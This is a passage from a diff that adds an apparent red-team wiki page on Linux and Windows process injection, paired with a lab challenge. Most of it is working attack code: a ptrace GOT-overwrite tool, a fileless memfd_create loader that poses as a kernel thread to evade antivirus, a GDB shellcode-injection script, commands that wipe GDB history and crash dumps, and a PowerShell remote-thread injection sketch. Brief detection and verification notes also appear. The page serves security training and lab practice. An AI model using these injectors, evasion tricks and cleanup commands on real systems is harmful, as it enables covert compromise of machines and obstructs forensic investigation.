+ * Compile: gcc -o got_overwrite got_overwrite.c
+ * Usage:   sudo ./got_overwrite &lt;target_pid&gt;
+ *
+ * This overwrites the GOT entry for a commonly-called function (sleep, printf)
+ * to point to shellcode, then restores it after execution.
+ */
+
+#define _GNU_SOURCE
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;sys/ptrace.h&gt;
+#include &lt;sys/wait.h&gt;
+#include &lt;sys/user.h&gt;
+#include &lt;elf.h&gt;
+
+/* Resolve a GOT entry address from /proc/PID/maps and the ELF */
+unsigned long find_got_entry(pid_t pid, const char *func_name)
+{
+    char maps_path[256], exe_path[256];
+    snprintf(maps_path, sizeof(maps_path), &#34;/proc/%d/maps&#34;, pid);
+    snprintf(exe_path, sizeof(exe_path), &#34;/proc/%d/exe&#34;, pid);
+
+    /* Find the target&#39;s text/data base addresses */
+    FILE *maps = fopen(maps_path, &#34;r&#34;);
+    unsigned long text_base = 0, data_base = 0;
+    char line[512];
+    while (fgets(line, sizeof(line), maps)) {
+        unsigned long start;
+        char perm[8], path[256] = {0};
+        if (sscanf(line, &#34;%lx-%*x %4s %*s %*s %*s %255s&#34;,
+            &amp;start, perm, path) &gt;= 2) {
+            if (perm[2] == &#39;x&#39; &amp;&amp; text_base == 0) {
+                text_base = start;
+            }
+            if (perm[1] == &#39;w&#39; &amp;&amp; strstr(perm, &#34;p&#34;) &amp;&amp;
+                path[0] != &#39;[&#39; &amp;&amp; data_base == 0) {
+                data_base = start;
+            }
+        }
+    }
+    fclose(maps);
+
+    if (!text_base || !data_base) {
+        fprintf(stderr, &#34;[-] Could not find bases\n&#34;);
+        return 0;
+    }
+
+    printf(&#34;[+] Text base: 0x%lx, Data base: 0x%lx\n&#34;,
+        text_base, data_base);
+
+    /* Read the ELF to find GOT entries
+     * The GOT is in the data segment. We need the .got.plt section.
+     * For simplicity, we read the ELF headers and parse sections. */
+    int exe_fd = open(exe_path, O_RDONLY);
+    if (exe_fd &lt; 0) {
+        perror(&#34;open /proc/PID/exe&#34;);
+        return 0;
+    }
+
+    /* Read ELF header to find section headers */
+    Elf64_Ehdr ehdr;
+    if (read(exe_fd, &amp;ehdr, sizeof(ehdr)) != sizeof(ehdr)) {
+        perror(&#34;read ELF header&#34;);
+        close(exe_fd);
+        return 0;
+    }
+
+    /* Read section header string table */
+    char *shstrtab = NULL;
+    off_t sht_offset = ehdr.e_shoff;
+    size_t sht_size = ehdr.e_shnum * ehdr.e_shentsize;
+
+    Elf64_Shdr *shdrs = malloc(sht_size);
+    lseek(exe_fd, sht_offset, SEEK_SET);
+    read(exe_fd, shdrs, sht_size);
+
+    /* Read string table for section names */
+    Elf64_Shdr *shstrtab_hdr = &amp;shdrs[ehdr.e_shstrndx];
+    size_t strtab_size = shstrtab_hdr-&gt;sh_size;
+    shstrtab = malloc(strtab_size);
+    lseek(exe_fd, shstrtab_hdr-&gt;sh_offset, SEEK_SET);
+    read(exe_fd, shstrtab, strtab_size);
+
+    /* Find .got.plt section */
+    unsigned long got_addr = 0;
+    size_t got_size = 0;
+    for (int i = 0; i &lt; ehdr.e_shnum; i++) {
+        char *section_name = shstrtab + shdrs[i].sh_name;
+        if (strcmp(section_name, &#34;.got.plt&#34;) == 0) {
+            got_addr = shdrs[i].sh_addr;
+            got_size = shdrs[i].sh_size;
+            printf(&#34;[+] .got.plt at 0x%lx (size %zu)\n&#34;,
+                got_addr, got_size);
+
+            /* Adjust for PIE: offset from text base */
+            if (text_base != 0 &amp;&amp; got_addr &lt; text_base + 0x100000) {
+                /* Dynamic entries: read .rela.plt for exact offsets */
+            }
+            break;
+        }
+    }
+
+    free(shdrs);
+    free(shstrtab);
+    close(exe_fd);
+
+    if (!got_addr) {
+        fprintf(stderr, &#34;[-] .got.plt section not found\n&#34;);
+        return 0;
+    }
+
+    return got_addr;
+}
+
+int main(int argc, char **argv)
+{
+    if (argc &lt; 3) {
+        fprintf(stderr, &#34;Usage: %s &lt;target_pid&gt; &lt;got_address_in_remote&gt;\n&#34;,
+            argv[0]);
+        fprintf(stderr, &#34;Compute GOT address using readelf on the target:\n&#34;);
+        fprintf(stderr, &#34;  readelf -r /proc/PID/exe | grep printf\n&#34;);
+        return EXIT_FAILURE;
+    }
+
+    pid_t target_pid = atoi(argv[1]);
+    unsigned long got_entry = strtoul(argv[2], NULL, 16);
+
+    printf(&#34;[*] Target: %d, GOT entry: 0x%lx\n&#34;, target_pid, got_entry);
+
+    /* Attach */
+    if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) &lt; 0) {
+        perror(&#34;PTRACE_ATTACH&#34;);
+        return EXIT_FAILURE;
+    }
+    int status;
+    waitpid(target_pid, &amp;status, 0);
+
+    /* Read the original GOT value */
+    unsigned long original_got = ptrace(PTRACE_PEEKTEXT,
+        target_pid, (void *)got_entry, NULL);
+    printf(&#34;[+] Original GOT entry at 0x%lx: 0x%lx\n&#34;,
+        got_entry, original_got);
+
+    /* Write shellcode to somewhere executable (stack) and
+     * overwrite the GOT entry to point to it.
+     * For a complete example: combine with the PTRACE_POKETEXT
+     * injection above, then redirect the GOT entry here. */
+
+    /* Restore and detach */
+    ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
+    printf(&#34;[+] Detached\n&#34;);
+
+    return EXIT_SUCCESS;
+}
+						</pre>
+					</section>
+					<section>
+						<h3 id="memfd-create-fileless-execution">memfd_create - Fileless Execution</h3>
+						<p>
+							<code>memfd_create(2)</code>
+							creates an anonymous file in memory (backed by tmpfs, not disk). Combined
+							with
+							<code>fexecve(3)</code>
+							, you can execute an ELF binary that never touches the filesystem, bypassing
+							file-based AV/
+							<abbr title="Endpoint Detection and Response">EDR</abbr>
+							.
+						</p>
+						<pre class="c">
+/*
+ * memfd_exec.c — Execute an ELF from memory (fileless)
+ * Compile: gcc -o memfd_exec memfd_exec.c
+ * Usage:   ./memfd_exec /path/to/embedded/payload
+ *
+ * The payload is executed from a memfd — no file on disk ever.
+ */
+
+#define _GNU_SOURCE
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;errno.h&gt;
+
+int main(int argc, char **argv)
+{
+    const char *payload_path = (argc &gt; 1) ? argv[1] : NULL;
+
+    /* Read the payload binary into memory */
+    int payload_fd = open(payload_path, O_RDONLY);
+    if (payload_fd &lt; 0) {
+        perror(&#34;open payload&#34;);
+        return EXIT_FAILURE;
+    }
+
+    struct stat payload_stat;
+    fstat(payload_fd, &amp;payload_stat);
+    size_t payload_size = payload_stat.st_size;
+
+    unsigned char *payload_data = mmap(NULL, payload_size,
+        PROT_READ, MAP_PRIVATE, payload_fd, 0);
+    close(payload_fd);
+
+    if (payload_data == MAP_FAILED) {
+        perror(&#34;mmap payload&#34;);
+        return EXIT_FAILURE;
+    }
+
+    /* Create an anonymous memory file */
+    int mem_fd = memfd_create(&#34;&#34;, MFD_CLOEXEC);
+    /* The empty string makes it truly anonymous — no name in
+     * /proc/self/fd. Use &#34;libsystem&#34; or similar for disguise. */
+    if (mem_fd &lt; 0) {
+        /* Fallback: use shm_open */
+        mem_fd = shm_open(&#34;/.payload&#34;, O_RDWR | O_CREAT | O_EXCL, 0700);
+        if (mem_fd &lt; 0) {
+            perror(&#34;memfd_create / shm_open&#34;);
+            munmap(payload_data, payload_size);
+            return EXIT_FAILURE;
+        }
+        shm_unlink(&#34;/.payload&#34;);
+    }
+
+    /* Write the ELF to the memfd */
+    if (write(mem_fd, payload_data, payload_size) !=
+        (ssize_t)payload_size) {
+        perror(&#34;write to memfd&#34;);
+        close(mem_fd);
+        munmap(payload_data, payload_size);
+        return EXIT_FAILURE;
+    }
+    munmap(payload_data, payload_size);
+
+    /* Execute the memfd */
+    char *cmd_argv[] = { &#34;[kworker/0:1]&#34;, (argc &gt; 2) ? argv[2] : NULL, NULL };
+    char *cmd_envp[] = { NULL };
+
+    /* Use fexecve to execute the memfd directly */
+    fexecve(mem_fd, cmd_argv, cmd_envp);
+
+    /* If fexecve returns, it failed */
+    perror(&#34;fexecve&#34;);
+
+    /* Fallback: exec the fd path via /proc */
+    char fd_path[64];
+    snprintf(fd_path, sizeof(fd_path), &#34;/proc/self/fd/%d&#34;, mem_fd);
+    execve(fd_path, cmd_argv, cmd_envp);
+
+    perror(&#34;execve fallback&#34;);
+    close(mem_fd);
+    return EXIT_FAILURE;
+}
+						</pre>
+						<h4 id="detection">Detection</h4>
+						<p>
+							Monitor
+							<code>memfd_create</code>
+							syscalls. Check
+							<code>/proc/PID/fd/</code>
+							for deleted files (
+							<code>(deleted)</code>
+							marker).
+							Check
+							<code>/proc/PID/exe</code>
+							; if it is a memfd file, it shows as a link to
+							<code>/memfd:</code>
+							.
+						</p>
+					</section>
+					<section>
+						<h3 id="gdb-injection-scripted">GDB Injection (Scripted)</h3>
+						<p>GDB is typically installed on development servers. It provides a higher-level interface to ptrace:</p>
+						<pre class="bash">
+#!/bin/bash
+# gdb_inject.sh — Inject shellcode into a process using GDB
+# Usage: sudo bash gdb_inject.sh &lt;pid&gt; &lt;shellcode_address&gt;
+
+TARGET_PID=$1
+SHELLCODE_FILE=&#34;/tmp/sc.bin&#34;   # raw shellcode bytes
+
+# Generate shellcode (example: exit(0) syscall)
+python3 -c &#34;
+import sys
+# mov eax, 60; xor edi, edi; syscall
+sc = b&#39;\x48\x31\xc0\x48\x83\xc0\x3c\x48\x31\xff\x0f\x05&#39;
+sys.stdout.buffer.write(sc)
+&#34; &gt; &#34;$SHELLCODE_FILE&#34;
+
+# Use GDB to inject
+gdb -p &#34;$TARGET_PID&#34; -batch \
+    -ex &#34;set \$shellcode_addr = 0x7ffff7fc1000&#34; \
+    -ex &#34;restore $SHELLCODE_FILE binary \$shellcode_addr&#34; \
+    -ex &#34;set \$rip = \$shellcode_addr&#34; \
+    -ex &#34;continue&#34; 2&gt;/dev/null
+
+rm -f &#34;$SHELLCODE_FILE&#34;
+						</pre>
+						<h4 id="gdb-stealth">GDB Stealth</h4>
+						<p>
+							GDB leaves traces. It writes to
+							<code>.gdb_history</code>
+							, loads Python scripts in
+							<code>~/.gdbinit</code>
+							, and
+							generates core dumps on segfaults. Clean up:
+						</p>
+						<pre class="bash">
+rm -f ~/.gdb_history /var/crash/*
+echo &#39;set confirm off&#39; &gt; /tmp/.gdbinit
+HOME=/tmp gdb -p &#34;$TARGET_PID&#34; -batch ...  # isolate history
+						</pre>
+					</section>
+					<section>
+						<h3 id="windows-process-injection-overview">Windows Process Injection (Overview)</h3>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Technique</th>
+									<th align="center">API</th>
+									<th align="center">Detection Difficulty</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center">CreateRemoteThread</td>
+									<td align="center">VirtualAllocEx, WriteProcessMemory, CreateRemoteThread</td>
+									<td align="center">Medium (traced by ETW)</td>
+								</tr>
+								<tr>
+									<td align="center">Process Hollowing</td>
+									<td align="center">CreateProcess (SUSPENDED), NtUnmapViewOfSection, VirtualAllocEx</td>
+									<td align="center">Medium-High</td>
+								</tr>
+								<tr>
+									<td align="center">Reflective DLL</td>
+									<td align="center">Custom LoadLibrary reimplementation, no disk write</td>
+									<td align="center">High</td>
+								</tr>
+								<tr>
+									<td align="center">APC Injection</td>
+									<td align="center">QueueUserAPC, target thread must be alertable</td>
+									<td align="center">Medium</td>
+								</tr>
+								<tr>
+									<td align="center">Atom Bombing</td>
+									<td align="center">GlobalAddAtom, NtQueueApcThread</td>
+									<td align="center">High</td>
+								</tr>
+								<tr>
+									<td align="center">Early Bird APC</td>
+									<td align="center">CreateProcess (SUSPENDED), QueueUserAPC, ResumeThread</td>
+									<td align="center">Medium-High</td>
+								</tr>
+							</tbody>
+						</table>
+						<p>Basic CreateRemoteThread injection (PowerShell):</p>
+						<pre class="powershell">
+# Concept only — requires a full Windows lab with appropriate tooling
+$process = Get-Process -Name notepad | Select-Object -First 1
+$hProcess = [Kernel32]::OpenProcess(0x1F0FFF, $false, $process.Id)
+
+# 0x1F0FFF = PROCESS_ALL_ACCESS
+# Allocate memory in target
+$remoteMem = [Kernel32]::VirtualAllocEx($hProcess, 0, 4096, 0x3000, 0x40)
+# 0x3000 = MEM_COMMIT | MEM_RESERVE, 0x40 = PAGE_EXECUTE_READWRITE
+
+# Write shellcode (example: calc.exe shellcode in hex)
+[byte[]]$shellcode = @(0xfc,0x48,0x83,...)
+[Kernel32]::WriteProcessMemory($hProcess, $remoteMem, $shellcode,
+    $shellcode.Length, [ref]$null)
+
+# Create remote thread pointing to shellcode
+[Kernel32]::CreateRemoteThread($hProcess, 0, 0, $remoteMem, 0, 0, [ref]$null)
+						</pre>
+					</section>
+					<section>
+						<h3 id="verification-steps">Verification Steps</h3>
+						<p>After performing injection, verify the state:</p>
+						<pre class="bash">
+# 1. Verify shellcode in memory
+sudo cat /proc/PID/maps | grep -E &#39;rwx&#39;
+sudo dd if=/proc/PID/mem bs=1 skip=&lt;address&gt; count=&lt;size&gt; 2&gt;/dev/null | xxd
+
+# 2. Check for anonymous executable mappings (memfd)
+cat /proc/PID/maps | grep &#39;memfd:&#39;
+
+# 3. Verify ptrace attachments
+cat /proc/PID/status | grep -E &#39;TracerPid|ptrace&#39;
+
+# 4. Check for LD_PRELOAD in environment
+cat /proc/PID/environ | tr &#39;\0&#39; &#39;\n&#39; | grep LD_PRELOAD
+
+# 5. Monitor syscalls
+sudo strace -p PID -e trace=ptrace,process_vm_writev,memfd_create
+						</pre>
+					</section>
+					<section>
+						<h3 id="common-mistakes">Common Mistakes</h3>
+						<ol>
+							<li><b>Forgetting to attach before writing to /proc/PID/mem</b> : Since Linux 3.2, writing to <code>/proc/PID/mem</code> requires ptrace attachment. Without it, writes fail silently or with EIO.</li>
+						</ol>
+						<ol>
+							<li><b>Writing to non-executable memory</b> : Shellcode in a non-executable page triggers SIGSEGV. Always verify the region has <code>x</code> in <code>/proc/PID/maps</code> .</li>
+						</ol>
+						<ol>
+							<li><b>Not accounting for ASLR</b> : Addresses from <code>readelf</code> or local compilation differ from the running process. Always parse <code>/proc/PID/maps</code> and compute offsets.</li>
+						</ol>
+						<ol>
+							<li><b>Shellcode not position-independent</b> : Hardcoded addresses or absolute jumps break after injection. Use relative addressing and syscall-based shellcode.</li>
+						</ol>
+						<ol>
+							<li><b>Leaving the target in an inconsistent state</b> : After shellcode finishes, the target's registers and stack are corrupted. If it doesn't crash (e.g., a reverse shell that runs long), you're fine. For quick payloads, restore registers after the shellcode returns.</li>
+						</ol>
+						<ol>
+							<li><b>Assuming same libc offsets</b> : When using <code>PTRACE_POKETEXT</code> to call <code>dlopen</code> , the offset of <code>__libc_dlopen_mode</code> varies across libc versions. Parse <code>/proc/PID/maps</code> and compute offsets at runtime.</li>
+						</ol>
+						<ol>
+							<li><b>Not testing on the actual target kernel</b> : Kernel configurations differ. <code>memfd_create</code> requires Linux 3.17+. <code>process_vm_writev</code> requires Linux 3.2+. Yama may be compiled out entirely on some embedded systems.</li>
+						</ol>
+					</section>
+					<section>
+						<h3 id="challenge">Challenge</h3>
+						<p>
+							Inject a payload into the looping
+							<code>/opt/target</code>
+							process inside the lab container. Attach with
+							ptrace, write shellcode into a writable-executable mapping, redirect
+							<abbr title="Routing Information Protocol">RIP</abbr>
+							, and confirm code execution. Then repeat the write with
+							<code>process_vm_writev</code>
+							and compare the
+							detection surface.
+						</p>
+						<p><a href="/wiki/articles/redteam/process-injection.Containerfile">process-injection.Containerfile</a></p>
+						<pre class="bash">
+podman build -t injection-lab -f process-injection.Containerfile .
+podman run -d --name inject-lab --cap-add=SYS_PTRACE \
+    --security-opt seccomp=unconfined injection-lab
+podman exec -it inject-lab bash
+
+# Inside the container the target and injectors are already built:
+#   /opt/target
+#   /opt/injection-lab/injectors/proc_mem_inject &lt;pid&gt;
+#   /opt/injection-lab/injectors/pvm_inject &lt;pid&gt; &lt;stack_addr&gt;
+#   /opt/injection-lab/injectors/memfd_exec /bin/id
+						</pre>
+					</section>
+					<section>
+						<h3 id="references">References</h3>
+						<ul>
+							<li><a class="icon-website" href="https://man7.org/linux/man-pages/man2/ptrace.2.html" target="_blank">ptrace(2) - Linux manual page</a></li>
+							<li><a class="icon-website" href="https://man7.org/linux/man-pages/man2/process_vm_writev.2.html" target="_blank">process_vm_writev(2) - Linux manual page</a></li>
+							<li><a class="icon-website" href="https://man7.org/linux/man-pages/man2/memfd_create.2.html" target="_blank">memfd_create(2) - Linux manual page</a></li>
+							<li><a class="icon-website" href="https://www.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html" target="_blank">Yama - Linux Security Module</a> - ptrace_scope restrictions</li>
+							<li><a class="icon-website" href="https://sourceware.org/gdb/documentation/" target="_blank">GDB Documentation</a> - ptrace frontend used for injection scripting</li>
+						</ul>
+					</section>
+				</article>
+			</main>
+		</div>
+
+		<footer>
+			<div></div>
+			<div class="print-not">Made with 💔 in Germany. &copy; Cookie Engineer (https://cookie.engineer). All rights (and jokes) reserved under European Law.</div>
+			<div></div>
+		</footer>
+
+	</body>
+</html>
